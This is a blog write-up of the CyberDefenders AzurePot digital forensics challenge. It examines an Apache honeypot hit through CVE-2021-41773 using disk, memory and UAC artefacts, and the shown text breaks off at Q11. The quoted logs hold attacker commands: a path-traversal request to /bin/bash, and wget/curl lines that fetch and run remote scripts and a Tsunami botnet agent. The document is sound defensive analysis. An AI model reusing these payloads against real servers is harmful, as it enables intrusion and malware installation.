

<!DOCTYPE html>
<html
  lang="fr"
  dir="ltr"
  class="scroll-smooth"
  data-default-appearance="dark"
  data-auto-appearance="false"
><head>
  <meta charset="utf-8" />
  
    <meta http-equiv="content-language" content="fr" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  
  <title>Cyberdefenders · Digital Forensics · Azurepot &middot; nathan.out</title>
    <meta name="title" content="Cyberdefenders · Digital Forensics · Azurepot &middot; nathan.out" />
  
  
  
  
  
  <link rel="canonical" href="https://nathan-out.github.io/write-up/cyberdefenders-digital-forensics-azurepot/" />
  
  
  
  
  
  
  
  
  
    
  
  
  <link
    type="text/css"
    rel="stylesheet"
    href="/css/main.bundle.min.3be096bcd7d4e68dd376b85e8c0157153f5ad62d1d8da3aa541971bdc763082a2357c4f56750b40c029adc50e54e156d1535c7d6a4cfe2f9fe7b128da3507509.css"
    integrity="sha512-O&#43;CWvNfU5o3TdrhejAFXFT9a1i0djaOqVBlxvcdjCCojV8T1Z1C0DAKa3FDlThVtFTXH1qTP4vn&#43;exKNo1B1CQ=="
  />
  
  
  <script type="text/javascript" src="/js/appearance.min.badab316c9287a5a42a843e4eb45da65bb3d194a5a0f5fa4a3e516160e67df0b8c65f4f19a8e146436e29d583699e6cb41d6bbe99e05e1dbaa877763bad9f8e2.js" integrity="sha512-utqzFskoelpCqEPk60XaZbs9GUpaD1&#43;ko&#43;UWFg5n3wuMZfTxmo4UZDbinVg2mebLQda76Z4F4duqh3djutn44g=="></script>
  
    
    
    
  
  
    
    
  
  
  
    
    <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.15ae6e2c9b1ac24a9ccf40003fa689efb1a18db1ee9b73d780b01a6c31b150441415862513e93184f68fe385759e4698b8763cba6a0f79493c1fed99ad5868d4.js" integrity="sha512-Fa5uLJsawkqcz0AAP6aJ77GhjbHum3PXgLAabDGxUEQUFYYlE&#43;kxhPaP44V1nkaYuHY8umoPeUk8H&#43;2ZrVho1A==" data-copy="Copier" data-copied="Copié"></script>
  
  
  
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
    <link rel="manifest" href="/site.webmanifest" />
  
  
  
  
  
  
  
  <meta property="og:title" content="Cyberdefenders · Digital Forensics · Azurepot" />
<meta property="og:description" content="This is my proposed solution for the cyberdefenders&rsquo;s challenge AzurePot published on April 20, 2023." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://nathan-out.github.io/write-up/cyberdefenders-digital-forensics-azurepot/" /><meta property="article:section" content="write-up" />
<meta property="article:published_time" content="2023-04-24T21:14:19+02:00" />
<meta property="article:modified_time" content="2023-04-24T21:14:19+02:00" /><meta property="og:site_name" content="nathan.out" />

  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Cyberdefenders · Digital Forensics · Azurepot"/>
<meta name="twitter:description" content="This is my proposed solution for the cyberdefenders&rsquo;s challenge AzurePot published on April 20, 2023."/>

  
  <script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Write-up",
    "name": "Cyberdefenders · Digital Forensics · Azurepot",
    "headline": "Cyberdefenders · Digital Forensics · Azurepot",
    
    "abstract": "This is my proposed solution for the cyberdefenders\u0026rsquo;s challenge AzurePot published on April 20, 2023.",
    "inLanguage": "fr",
    "url" : "https:\/\/nathan-out.github.io\/write-up\/cyberdefenders-digital-forensics-azurepot\/",
    "author" : {
      "@type": "Person",
      "name": "nathan.out"
    },
    "copyrightYear": "2023",
    "dateCreated": "2023-04-24T21:14:19\u002b02:00",
    "datePublished": "2023-04-24T21:14:19\u002b02:00",
    
    "dateModified": "2023-04-24T21:14:19\u002b02:00",
    
    
    
    "mainEntityOfPage": "true",
    "wordCount": "2495"
  }]
  </script>


  
  <meta name="author" content="nathan.out" />
  
    
      <link href="https://github.com/nathan-out" rel="me" />
    
  
  
  






  
  
  
  


  
  
</head>
<body
    class="flex flex-col h-screen px-6 m-auto text-lg leading-7 bg-neutral text-neutral-900 sm:px-14 md:px-24 lg:px-32 dark:bg-neutral-800 dark:text-neutral max-w-7xl"
  >
    <div id="the-top" class="absolute flex self-center">
      <a
        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 dark:bg-neutral-600 focus:translate-y-0"
        href="#main-content"
        ><span class="font-bold ltr:pr-2 rtl:pl-2 text-primary-600 dark:text-primary-400"
          >&darr;</span
        >Aller au contenu</a
      >
    </div>
    
    
      <header class="py-6 font-semibold sm:py-10 text-neutral-900 dark:text-neutral print:hidden">
  <nav class="flex justify-between">
    
    <div>
      
        <a
          class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
          rel="me"
          href="/"
          >nathan.out</a
        >
      

    </div>
    
    
      <ul class="flex flex-col list-none ltr:text-right rtl:text-left sm:flex-row">
        
          
            <li class="mb-1 sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
              <a
                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
                href="/posts/"
                title="Mes articles"
                >Articles</a
              >
            </li>
          
            <li class="mb-1 sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
              <a
                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
                href="/a-propos/"
                title="A Propos"
                >A propos</a
              >
            </li>
          
            <li class="mb-1 sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
              <a
                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
                href="/write-up/"
                title="Write-up"
                >Write-up</a
              >
            </li>
          
        
        
          <li class="ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
            <button
              id="search-button"
              class="text-base hover:text-primary-600 dark:hover:text-primary-400"
              title="Rechercher (/)"
            >
              

  <span class="relative inline-block align-text-bottom icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
          </li>
        
      </ul>
    
  </nav>
</header>

    
    <div class="relative flex flex-col grow">
      <main id="main-content" class="grow">
        
  <article>
    <header class="max-w-prose">
      
        <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
  
  
    
  
    
  
  <li class="inline hidden">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/"
      >Blog</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline ">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/write-up/"
      >Write-up</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline hidden">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/write-up/cyberdefenders-digital-forensics-azurepot/"
      >Cyberdefenders · Digital Forensics · Azurepot</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

</ol>


      
      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
        Cyberdefenders · Digital Forensics · Azurepot
      </h1>
      <div class="mt-8 mb-12 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
        





  
  



  

  
  
    
  

  

  

  
    
  

  


  <div class="flex flex-row flex-wrap items-center">
    
    
      <time datetime="2023-04-24 21:14:19 &#43;0200 CEST">24 avril 2023</time><span class="px-2 text-primary-500">&middot;</span><span title="Temps de lecture">12 mins</span>
    

    
    
  </div>

  
  


      </div>
    </header>
    <section class="flex flex-col max-w-full mt-0 prose lg:flex-row dark:prose-invert">
      
        <div class="order-first px-0 lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8 lg:order-last">
          <div class="ltr:pl-5 rtl:pr-5 toc lg:sticky lg:top-10 print:hidden">
            <details open class="mt-0 overflow-hidden rounded-lg rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5">
  <summary
    class="block py-1 text-lg font-semibold cursor-pointer rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 text-neutral-800 dark:text-neutral-100 lg:hidden bg-neutral-100 dark:bg-neutral-700"
  >
    Sommaire
  </summary>
  <div
    class="py-2 border-dotted ltr:border-l rtl:border-r rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 border-neutral-300 dark:border-neutral-600"
  >
    <nav id="TableOfContents">
  <ul>
    <li><a href="#q1-there-is-a-script-that-runs-every-minute-to-do-cleanup-what-is-the-name-of-the-file">Q1 There is a script that runs every minute to do cleanup. What is the name of the file?</a></li>
    <li><a href="#q2-the-script-in-the-q1-terminates-processes-associated-with-two-bitcoin-miner-malware-files-what-is-the-name-of-1st-malware-file">Q2 The script in the Q#1 terminates processes associated with two Bitcoin miner malware files. What is the name of 1st malware file?</a></li>
    <li><a href="#the-script-in-q1-changes-the-permissions-for-some-files-what-is-their-new-permission">The script in Q#1 changes the permissions for some files. What is their new permission?</a></li>
    <li><a href="#q4-what-is-the-sha256-of-the-botnet-agent-file">Q4 What is the sha256 of the botnet agent file?</a></li>
    <li><a href="#q5-what-is-the-name-of-the-botnet-in-q4">Q5 What is the name of the botnet in Q#4?</a></li>
    <li><a href="#q6-what-ip-address-matches-the-creation-timestamp-of-the-botnet-agent-file-in-q4">Q6 What IP address matches the creation timestamp of the botnet agent file in Q#4?</a></li>
    <li><a href="#q7-what-url-did-the-attacker-use-to-download-the-botnet-agent">Q7 What URL did the attacker use to download the botnet agent?</a></li>
    <li><a href="#q8-what-is-the-name-of-the-file-that-the-attacker-downloaded-to-execute-the-malicious-script-and-subsequently-remove-itself">Q8 What is the name of the file that the attacker downloaded to execute the malicious script and subsequently remove itself?</a></li>
    <li><a href="#q9-the-attacker-downloaded-sh-scripts-what-are-the-names-of-these-files">Q9 The attacker downloaded sh scripts. What are the names of these files?</a></li>
    <li><a href="#q10-two-suspicious-processes-were-running-from-a-deleted-directory-what-are-their-pids">Q10 Two suspicious processes were running from a deleted directory. What are their PIDs?</a></li>
    <li><a href="#q11-what-is-the-suspicious-command-line-associated-with-the-2nd-pid-in-q10">Q11 What is the suspicious command line associated with the 2nd PID in Q#10?</a></li>
    <li><a href="#q12-uac-gathered-some-data-from-the-second-process-in-q10-what-is-the-remote-ip-address-and-remote-port-that-was-used-in-the-attack">Q12 UAC gathered some data from the second process in Q#10. What is the remote IP address and remote port that was used in the attack?</a></li>
    <li><a href="#q13-which-user-was-responsible-for-executing-the-command-in-q11">Q13 Which user was responsible for executing the command in Q#11?</a></li>
    <li><a href="#q14-two-suspicious-shell-processes-were-running-from-the-tmp-folder-what-are-their-pids">Q14 Two suspicious shell processes were running from the tmp folder. What are their PIDs?</a></li>
    <li><a href="#q15-what-is-the-mac-address-of-the-captured-memory">Q15 What is the MAC address of the captured memory?</a></li>
    <li><a href="#q16-from-bash-history-the-attacker-downloaded-an-sh-script-what-is-the-name-of-the-file">Q16 From Bash history. The attacker downloaded an sh script. What is the name of the file?</a></li>
  </ul>
</nav>
  </div>
</details>

          </div>
        </div>
      
      <div class="min-w-0 min-h-0 max-w-prose">
        <p>This is my proposed solution for the cyberdefenders&rsquo;s challenge <a href="https://cyberdefenders.org/blueteam-ctf-challenges/101">AzurePot</a> published on April 20, 2023.</p>
<p>The scenario :</p>
<blockquote>
<p>This Ubuntu Linux honeypot was put online in Azure in early October to watch what happens with those exploiting CVE-2021-41773.</p>
</blockquote>
<blockquote>
<p>Initially, there was a large number of crypto miners that hit the system. You will see one cron script meant to remove files named kinsing in /tmp. This was a way of preventing these miners so more interesting things could occur.</p>
</blockquote>
<p>There are three files:</p>
<ul>
<li>sdb.vhd.gz</li>
<li>VHD of the main drive obtained through an Azure disk snapshot</li>
<li>ubuntu.20211208.mem.gz</li>
<li>Dump of memory using Lime</li>
<li>uac.tgz</li>
<li>Results of UAC running on the system</li>
</ul>
<blockquote>
<p>Items were obtained in the order above - the drive was snapshotted, memory was grabbed, then UAC was run.</p>
</blockquote>
<p>Helpful Tools:</p>
<ul>
<li>FTK Imager (not mandatory; you can mount the vhd file on Linux)</li>
<li>Text Editor (I like VsCode since it&rsquo;s much efficient than gedit or sublime for large files)</li>
<li>grep</li>
<li>awk (not used here)</li>
<li>Volatility2 and 3 (not mentionned in the scenario but useful for the two last questions)</li>
</ul>
<hr>
<p><strong>NOTA :</strong></p>
<p>For the first 9 questions, you have to browse the disk dump file (sdb.vhd). You can use FTK Imager or you can mount it on Linux. I used this tutorial: <a href="https://linux.how2shout.com/mount-virtual-hard-disk-vhd-file-ubuntu-linux/">How to mount Virtual Hard disk (VHD) file in Ubuntu Linux?</a> because I have neither Windows nor Wine.</p>
<h2 id="q1-there-is-a-script-that-runs-every-minute-to-do-cleanup-what-is-the-name-of-the-file" class="relative group">Q1 There is a script that runs every minute to do cleanup. What is the name of the file? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q1-there-is-a-script-that-runs-every-minute-to-do-cleanup-what-is-the-name-of-the-file" aria-label="Ancre">#</a></span></h2>
<p><em>file: sdb.vhd</em></p>
<p>I you don&rsquo;t know what <code>cron</code> files are, look for scripts that run periodically. On a Linux system you can find it here: <code>/var/spool/cron/crontabs</code>.</p>
<pre tabindex="0"><code>...
# m h  dom mon dow   command
* * * * * /root/.remove.sh
</code></pre><p>Answer : <code>.remove.sh</code></p>
<h2 id="q2-the-script-in-the-q1-terminates-processes-associated-with-two-bitcoin-miner-malware-files-what-is-the-name-of-1st-malware-file" class="relative group">Q2 The script in the Q#1 terminates processes associated with two Bitcoin miner malware files. What is the name of 1st malware file? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q2-the-script-in-the-q1-terminates-processes-associated-with-two-bitcoin-miner-malware-files-what-is-the-name-of-1st-malware-file" aria-label="Ancre">#</a></span></h2>
<p><em>file: sdb.vhd</em></p>
<p>Scenario gives a hint: <em>You will see one cron script meant to remove files named kinsing in /tmp</em>.</p>
<p>So in <code>/tmp</code> I list all the files:</p>
<pre tabindex="0"><code># ls -lah
total 2,4G
drwxrwxrwt  9 root   root    12K déc.   8  2021 .
drwxr-xr-x 23 root   root   4,0K déc.   4  2021 ..
drwxrwxrwt  2 root   root   4,0K oct.   9  2021 .font-unix
drwxrwxrwt  2 root   root   4,0K oct.   9  2021 .ICE-unix
-r--r--r--  1 root   root      0 oct.   9  2021 kdevtmpfsi
-r--r--r--  1 root   root   3,8M oct.  11  2021 kdevtmpfsi324024279
-r--r--r--  1 root   root   3,8M oct.  11  2021 kdevtmpfsi824415644
-r--r--r--  1 root   root      0 oct.   9  2021 kinsing
...
</code></pre><p>The first one is <code>kinsing</code> (oct) and this this the answer.</p>
<h2 id="the-script-in-q1-changes-the-permissions-for-some-files-what-is-their-new-permission" class="relative group">The script in Q#1 changes the permissions for some files. What is their new permission? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#the-script-in-q1-changes-the-permissions-for-some-files-what-is-their-new-permission" aria-label="Ancre">#</a></span></h2>
<p><em>file: sdb.vhd</em></p>
<p>Q1 gives me location of <code>.remove.sh</code>, I print its content :</p>
<pre tabindex="0"><code># cat root/.remove.sh 
#!/bin/bash

for PID in `ps -ef | egrep &#34;kinsing|kdevtmp&#34; | grep &#34;/tmp&#34;  | awk &#39;{ print $2 }&#39;`
do
	kill -9 $PID
done

chown root.root /tmp/k*
chmod 444 /tmp/k*
</code></pre><p>The script changes permissions to <code>444</code>.</p>
<h2 id="q4-what-is-the-sha256-of-the-botnet-agent-file" class="relative group">Q4 What is the sha256 of the botnet agent file? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q4-what-is-the-sha256-of-the-botnet-agent-file" aria-label="Ancre">#</a></span></h2>
<p><em>file: sdb.vhd</em></p>
<p>The botnet agent is not located on <code>/tmp</code> but on <code>/var/tmp</code> I don&rsquo;t know why, maybe to hide and not locate it in the same directory as the cryptomineers. In this directory you could see an executable file and calculate its sha256 sum :</p>
<pre tabindex="0"><code># ls -lah var/tmp
total 68K
drwxrwxrwt  5 root   root   4,0K déc.   8  2021 .
drwxr-xr-x 13 root   root   4,0K sept. 28  2021 ..
drwxrwxrwt  2 root   root   4,0K oct.   9  2021 cloud-init
-rwxr-xr-x  1 daemon daemon  48K nov.  11  2021 dk86
...

# sha256sum var/tmp/dk86
0e574fd30e806fe4298b3cbccb8d1089454f42f52892f87554325cb352646049  var/tmp/dk86
</code></pre><h2 id="q5-what-is-the-name-of-the-botnet-in-q4" class="relative group">Q5 What is the name of the botnet in Q#4? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q5-what-is-the-name-of-the-botnet-in-q4" aria-label="Ancre">#</a></span></h2>
<p><em>file: sdb.vhd</em></p>
<p>Put the hash into <a href="https://www.virustotal.com/gui/file/0e574fd30e806fe4298b3cbccb8d1089454f42f52892f87554325cb352646049">VirusTotal</a> and you will see that the popular threat label is <code>trojan.linux/tsunami</code>.</p>
<h2 id="q6-what-ip-address-matches-the-creation-timestamp-of-the-botnet-agent-file-in-q4" class="relative group">Q6 What IP address matches the creation timestamp of the botnet agent file in Q#4? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q6-what-ip-address-matches-the-creation-timestamp-of-the-botnet-agent-file-in-q4" aria-label="Ancre">#</a></span></h2>
<p><em>file: sdb.vhd</em></p>
<p>The CVE-2021-41773 is related to Appache2 (scenario). Check the Apache2 log files will be helpful in answering the following questions. Theses files are located on <code>/var/log/apache2/access_log</code> file. Unfortunately, <code>access_log</code> and <code>error_log</code> files are too big for a raw investigation. The tip is to filter on the creation timestamp of <code>dk86</code>:</p>
<pre tabindex="0"><code># stat var/tmp/dk86
  Fichier : var/tmp/dk86
   Taille : 48748     	Blocs : 96         Blocs d&#39;E/S : 4096   fichier
Périphérique : 3ah/58d	Inœud : 921         Liens : 1
Accès : (0755/-rwxr-xr-x)  UID : (    1/  daemon)   GID : (    1/  daemon)
Accès : 2021-11-11 20:09:51.454413754 +0100
Modif. : 2021-11-11 20:09:51.454413754 +0100
Changt : 2021-11-11 20:09:51.454413754 +0100
  Créé : -
</code></pre><p><strong>Be carreful timezone is displayed as +1 so you have to substract one hour to keep the timezone of the disk dump.</strong></p>
<p>Use <code>grep</code> on the <code>access_log</code> (<code>error_log</code> does not return anything) and you have the botnet agent IP:</p>
<pre tabindex="0"><code>grep 11/Nov/2021:19:09:51 var/log/apache2/access_log
141.135.85.36 - - [11/Nov/2021:19:09:51 +0000] &#34;POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash HTTP/1.1&#34; 200 - &#34;-&#34; &#34;-&#34;
</code></pre><h2 id="q7-what-url-did-the-attacker-use-to-download-the-botnet-agent" class="relative group">Q7 What URL did the attacker use to download the botnet agent? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q7-what-url-did-the-attacker-use-to-download-the-botnet-agent" aria-label="Ancre">#</a></span></h2>
<p><em>file: sdb.vhd</em></p>
<p>I&rsquo;m not sure of my reasoning, but as the attacker tried to exploit Apache2, interesting fingerprints were recorded in <code>error_log</code>. At this time we know this:</p>
<ul>
<li>botnet agent name: <code>dk86</code></li>
<li>attacker exploit tries to exploit CVE-2021-41773</li>
<li>a quick look inside <code>error_log</code> show that there is a bash injection</li>
<li>timestamp of the botnet file creation : 11/Nov/2021:19:09:51 (the dowloading timestamp must be smaller)</li>
</ul>
<p>Assuming the hacker downloaded the botnet agent earlier in the day, we could create an accurate filter. I assume the attacker used <code>curl</code> or <code>grep</code> to download the payload.</p>
<pre tabindex="0"><code># grep -E &#39;Nov 11 .* 2021.* (wget|curl).*dk86&#39; var/log/apache2/error_log
[Thu Nov 11 19:07:41.956674 2021] [dumpio:trace7] [pid 804:tid 139978797401856] mod_dumpio.c(103): [client 141.135.85.36:51774] mod_dumpio:  dumpio_in (data-HEAP): echo; wget -O dk86 http://138.197.206.223:80/wp-content/themes/twentysixteen/dk86; chmod +x dk86; ./dk86 &amp;;
[Thu Nov 11 19:07:41.962142 2021] [cgi:error] [pid 804:tid 139978797401856] [client 141.135.85.36:51774] AH01215: /bin/bash: line 1: `echo; wget -O dk86 http://138.197.206.223:80/wp-content/themes/twentysixteen/dk86; chmod +x dk86; ./dk86 &amp;;&#39;: /bin/bash
[Thu Nov 11 19:09:29.415116 2021] [dumpio:trace7] [pid 803:tid 139978805794560] mod_dumpio.c(103): [client 141.135.85.36:51978] mod_dumpio:  dumpio_in (data-HEAP): echo; wget -O /tmp/dk86 http://138.197.206.223:80/wp-content/themes/twentysixteen/dk86;
</code></pre><p>URL appears !</p>
<h2 id="q8-what-is-the-name-of-the-file-that-the-attacker-downloaded-to-execute-the-malicious-script-and-subsequently-remove-itself" class="relative group">Q8 What is the name of the file that the attacker downloaded to execute the malicious script and subsequently remove itself? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q8-what-is-the-name-of-the-file-that-the-attacker-downloaded-to-execute-the-malicious-script-and-subsequently-remove-itself" aria-label="Ancre">#</a></span></h2>
<p><em>file: sdb.vhd</em></p>
<p>Tricky question because the attacker does not used the same C2 serveur as in the previous question. A <code>grep</code> filter on <code>http://138.197.206.223:80</code> returns nothing more than the previous question. My thinking was to expand my timestamp filter (no longer on the day but on the whole month of November) and look at the injected bash.</p>
<pre tabindex="0"><code># grep -E &#39;Nov.*2021.*(wget|curl)&#39; var/log/apache2/error_log
[Mon Nov 01 10:15:10.895210 2021] [dumpio:trace7] [pid 4449:tid 139978898114304] mod_dumpio.c(103): [client 195.19.192.26:38080] mod_dumpio:  dumpio_in (data-HEAP): A=|echo;(curl -s 195.19.192.28/ap.sh||wget -q -O- 195.19.192.28/ap.sh)|bash
...
</code></pre><p>We need more accuracy in the filter. Some of the matches are on error on <code>curl</code> or <code>wget</code> so we could improve the regex in order to catch only the commands and not the error (adding &rsquo; \-&rsquo; at the end catch the command line and exclude error messages):</p>
<pre tabindex="0"><code># grep -E &#39;Nov.*2021.*(wget|curl) \-&#39; var/log/apache2/error_log
[Mon Nov 01 10:15:10.895210 2021] [dumpio:trace7] [pid 4449:tid 139978898114304] mod_dumpio.c(103): [client 195.19.192.26:38080] mod_dumpio:  dumpio_in (data-HEAP): A=|echo;(curl -s 195.19.192.28/ap.sh||wget -q -O- 195.19.192.28/ap.sh)|bash
...
</code></pre><p>Even better, we could see that the attacker dowloaded strings encoded in base64. Let&rsquo;s retrieve all the b64 encoded strings and decode:</p>
<pre tabindex="0"><code>...grep flags ... --data-urlencode &#39;s=UE...Cg==&#39; -o .install; chmod +x .install; sh .install &gt; /dev/null 2&gt;&amp;1 &amp; 
		echo &#39;Done&#39;
	else
		echo &#39;Already install. Started&#39;; cd .log/101068/.spoollog &amp;&amp; sh .cron.sh &gt; /dev/null 2&gt;&amp;1 &amp; 
	fi
else 
	echo &#39;Already install Running&#39;
fi
</code></pre><p>Two interesting things:</p>
<ul>
<li>a file named <code>.install</code></li>
<li>an another string encoded in base64 let&rsquo;s decode it</li>
</ul>
<pre tabindex="0"><code>...
rm -rf .install
</code></pre><p>The file <code>.install</code> remove itself, this is the flag !</p>
<h2 id="q9-the-attacker-downloaded-sh-scripts-what-are-the-names-of-these-files" class="relative group">Q9 The attacker downloaded sh scripts. What are the names of these files? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q9-the-attacker-downloaded-sh-scripts-what-are-the-names-of-these-files" aria-label="Ancre">#</a></span></h2>
<p><em>file: sdb.vhd</em></p>
<p>0_cron.sh, 0_linux.sh, ap.sh</p>
<p>At the previous step, you might found theses files. But we can found theses files applying this filter:</p>
<pre tabindex="0"><code># grep -Eo &#39;(curl|wget).*.{5}\.sh&#39; var/log/apache2/error_log|uniq
curl -s 195.19.192.28/ap.sh||wget -q -O- 195.19.192.28/ap.sh
curl -o-  http://86.105.195.120/cleanfda/init.sh
curl -s 195.19.192.28/ap.sh||wget -q -O- 195.19.192.28/ap.sh
...
</code></pre><p>There is some bash files and I think they are all potentially malicious. But the ones that fit the expected pattern are :</p>
<ul>
<li>
<p><code>0_cron.sh</code></p>
</li>
<li>
<p><code>0_linux.sh</code></p>
</li>
<li>
<p><code>ap.sh</code></p>
</li>
</ul>
<h2 id="q10-two-suspicious-processes-were-running-from-a-deleted-directory-what-are-their-pids" class="relative group">Q10 Two suspicious processes were running from a deleted directory. What are their PIDs? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q10-two-suspicious-processes-were-running-from-a-deleted-directory-what-are-their-pids" aria-label="Ancre">#</a></span></h2>
<p><em>file: uac</em></p>
<p>We are searching for processes so let&rsquo;s explore the <code>live_response/process</code> folder. We could see that some of the files are named with a command name (for example <code>ps.txt</code>). A command used to link a process with a deleted directory is <code>lsof</code> so let&rsquo;s check <code>lsof_-nPl.txt</code>. Inside, the <code>NAME</code> column seems to indicate the location of the process, let&rsquo;s search for deleted directory.</p>
<pre tabindex="0"><code># grep &#39;deleted&#39; live_response/process/lsof_-nPl.txt
COMMAND     PID   TID     USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME
none        609              0  txt       REG                0,1     8632      15254 / (deleted)
sleep      6388              1  cwd       DIR               8,17        0     528743 /var/tmp/.log/101068/.spoollog (deleted)
sh        20645              1  cwd       DIR               8,17        0     528743 /var/tmp/.log/101068/.spoollog (deleted)
sh        20645              1   10r      REG               8,17     9087     528810 /var/tmp/.log/101068/.spoollog/.src.sh (deleted)
agettyd   24330              1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
agettyd   24330  7897        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
agettyd   24330 24333        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
agettyd   24330 24334        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
agettyd   24330 24335        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
agettyd   24330 24336        1  txt       REG               8,17  7244192      30248 /tmp/agettyd (deleted)
</code></pre><p><code>agettyd</code> have a valide name, which does not mean that is not a malicious process, but there it is more suspicious: <code>src.sh</code> (PID <code>20645</code>); it appears in the <code>error_log</code> file. At the same place, there was an another process was running : PID <code>6388</code>. We have our two PIDs.</p>
<h2 id="q11-what-is-the-suspicious-command-line-associated-with-the-2nd-pid-in-q10" class="relative group">Q11 What is the suspicious command line associated with the 2nd PID in Q#10? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q11-what-is-the-suspicious-command-line-associated-with-the-2nd-pid-in-q10" aria-label="Ancre">#</a></span></h2>
<p><em>file: uac</em></p>
<p>To link command line and PID we can use <code>ps -e</code> and we have <code>ps_-ef.txt</code> file. Let&rsquo;s grep it and get the command line:</p>
<pre tabindex="0"><code># grep 20645 live_response/process/ps_-ef.txt
UID        PID  PPID  C STIME TTY          TIME CMD
daemon   20645     1  0 Nov14 ?        03:01:59 sh .src.sh
